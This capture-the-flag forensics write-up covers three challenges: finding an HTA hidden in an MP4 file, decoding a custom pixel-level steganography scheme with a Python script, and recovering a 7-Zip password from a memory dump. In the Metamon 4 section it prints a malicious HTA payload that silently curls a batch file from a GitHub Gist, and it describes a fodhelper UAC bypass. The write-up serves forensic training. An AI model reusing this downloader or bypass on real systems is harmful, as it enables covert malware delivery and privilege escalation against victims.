Metamon 4 — Steganography in b.mp4 → HTA Payload

steganography malware analysis

Running exiftool on b.mp4 immediately raises suspicion — 0 second duration and an unknown trailer warning. It's not really a video.

fig 10 — exiftool revealing b.mp4 is suspicious (0s duration, unknown trailer)

Running binwalk confirms an HTML document is appended after the MP4 data:

fig 11 — binwalk detecting an embedded HTML document at offset 4172063
1

Extract the embedded HTML using dd at the detected offset:

extract
$ dd if=b.mp4 bs=1 skip=4172063 count=421 of=extracted.html
$ cat extracted.html
2

The extracted file is an HTA (HTML Application) — runs silently minimized, executes a cmd command to curl down rizzler.bat from a GitHub Gist:

vbscript extracted.html (HTA payload)
<HTA:APPLICATION SHOWINTASKBAR="no" WINDOWSTATE="minimize">
Set s = CreateObject("WScript.Shell")
s.Run "cmd /c curl -L -o %temp%\rizzler.bat ""https://gist.githubusercontent.com/pinarat/c91018d3\rizzler.bat""", 1, False
3

Browsing the Gist URL reveals rizzler.bat — a batch file with a large Base64-encoded :PAYLOAD block. Decoding it exposes a PowerShell stager with the flag embedded as a variable:

fig 12 — decoded PowerShell payload containing the flag variable
malware behaviour — rizzler.bat

UAC bypass via fodhelper.exe registry hijacking → URL reconstructed via ROT cipher → downloads profile.png as next-stage carrier → calls oz1rizz extraction function.

Metamon 5 — Pixel-level Steganography in profile.png

steganography reverse engineering

Looking at the commit history of pinarat/a, a profile.png was deleted. Downloading it from the commit history, standard LSB stego tools yield nothing.

The decoded PowerShell from rizzler.bat reveals a custom scheme: full RGB byte values of each pixel are raw data bytes. Pixels 0 and 1 store the payload size as a 32-bit integer header.

fig 13 — binwalk on profile.png (standard approach doesn't work)
fig 14 — further investigation of artifacts
custom stego scheme

Pixel 0 + Pixel 1 → 32-bit payload size. From Pixel 2 onward, every R/G/B value is a raw data byte. XOR'd with key derived by ROT-24 of 54e6739f170fg582, then gzip-decompressed.

python extract.py
from PIL import Image
import gzip

def rot_cipher(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            start = ord('A') if char.isupper() else ord('a')
            result += chr(start + (ord(char) - start + shift) % 26)
        else:
            result += char
    return result

# 1. Load image
img = Image.open("profile.png").convert('RGB')
pixels = list(img.getdata())

# 2. Read payload size from pixels 0 and 1
p0, p1 = pixels[0], pixels[1]
size = (p0[0] << 24) | (p0[1] << 16) | (p0[2] << 8) | p1[0]

# 3. Extract raw bytes from pixel 2 onward
raw_bytes = bytearray()
for p in pixels[2:]:
    raw_bytes.extend([p[0], p[1], p[2]])
    if len(raw_bytes) >= size: break
raw_bytes = raw_bytes[:size]

# 4. Derive XOR key via ROT-24
real_key = rot_cipher("54e6739f170fg582", 24).encode('ascii')

# 5. XOR decrypt then gzip decompress
decrypted = bytearray(b ^ real_key[i % len(real_key)] for i, b in enumerate(raw_bytes))
payload = gzip.decompress(decrypted)
print(payload.decode('utf-8', errors='ignore'))

Metamon 6 — Password Recovery from memdump

memory forensics
fig 16 — Metamon 6 challenge description

Back in the AD1 image, the Desktop also contained LOCKED.7z and a memdump.mem raw memory dump. Running strings on the dump and grepping for LOCKED.7z surfaces the exact 7-Zip command the attacker ran — including the password passed via -p:

memory forensics
$ strings -el memdump.mem | grep "LOCKED.7z"
...7z.exe" a "...\LOCKED.7z" "...\important.txt" -pGcJqVl9YaVwBIPC4nbOW -mhe=on"
fig 17 — password recovered from memdump via strings grep
extract archive
$ 7z x LOCKED.7z
Enter password: GcJqVl9YaVwBIPC4nbOW
Everything is Ok
fig 18 — successful extraction of LOCKED.7z with recovered password
key takeaway — memory forensics

Passwords passed as command-line arguments are preserved in memory. strings on raw dumps can surface credentials and keys that an attacker assumed were ephemeral.
